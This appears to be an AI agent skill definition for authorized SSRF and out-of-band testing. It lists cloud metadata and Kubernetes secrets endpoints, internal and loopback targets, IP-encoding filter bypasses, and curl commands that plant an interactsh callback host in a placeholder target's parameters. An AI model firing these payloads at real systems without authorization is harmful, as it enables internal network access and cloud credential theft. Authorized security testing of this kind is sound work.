agyos_skill.intent: Out-of-band (OOB) and Server-Side Request Forgery (SSRF) testing. Detects blind SSRF, metadata leaks, and internal network pivot vulnerabilities.
agyos_skill.instructions: > **⚠️ AUTHORIZED USE ONLY**: For authorized security assessments and application hardening. Server-Side Request Forgery (SSRF) occurs when a web application fetches a remote resource without validating the user-supplied URL. In blind SSRF scenarios, responses are not rendered back to the user; detection relies on **Out-Of-Band (OOB)** interaction listeners (DNS, HTTP, HTTPS) such as Interactsh, ProjectDiscovery, or internal callback listeners. 1. **Cloud Metadata Endpoints**: - AWS / GCP / Azure IMDSv1: `http://169.254.169.254/latest/meta-data/` - DigitalOcean: `http://169.254.169.254/metadata/v1.json` - Kubernetes Pod Secrets: `https://kubernetes.default.svc/api/v1/namespaces/default/secrets` 2. **Loopback & Internal Subnet Access**: - `http://127.0.0.1:8080/admin` - `http://localhost:6379/` (Redis unauthorized command injection) - `http://10.0.0.1/`, `http://192.168.1.1/` 3. **Alternative IP Encodings (Filter Bypasses)**: - Dotted decimal bypass: `http://2130706433` (evaluates to 127.0.0.1) - Hexadecimal bypass: `http://0x7f.0x0.0x0.0x1` - Octal bypass: `http://0177.0.0.01` - IPv6 local: `http://[::1]/` - DNS rebinding domains. Using `interactsh-client` or custom DNS listener: ```bash interactsh-client -json -o oob_interactions.json & OOB_HOST="c2xxxxxxxxxxxx.oast.fun" ``` Scan query strings, JSON payloads, webhook configs, XML docs, and HTTP headers: ```bash curl -s -X POST https://target.example.com/api/webhook -H "Content-Type: application/json" -d '{"url": "http://webhook.'$OOB_HOST'"}' curl -s -X GET "https://target.example.com/preview?url=http://param.'$OOB_HOST'"
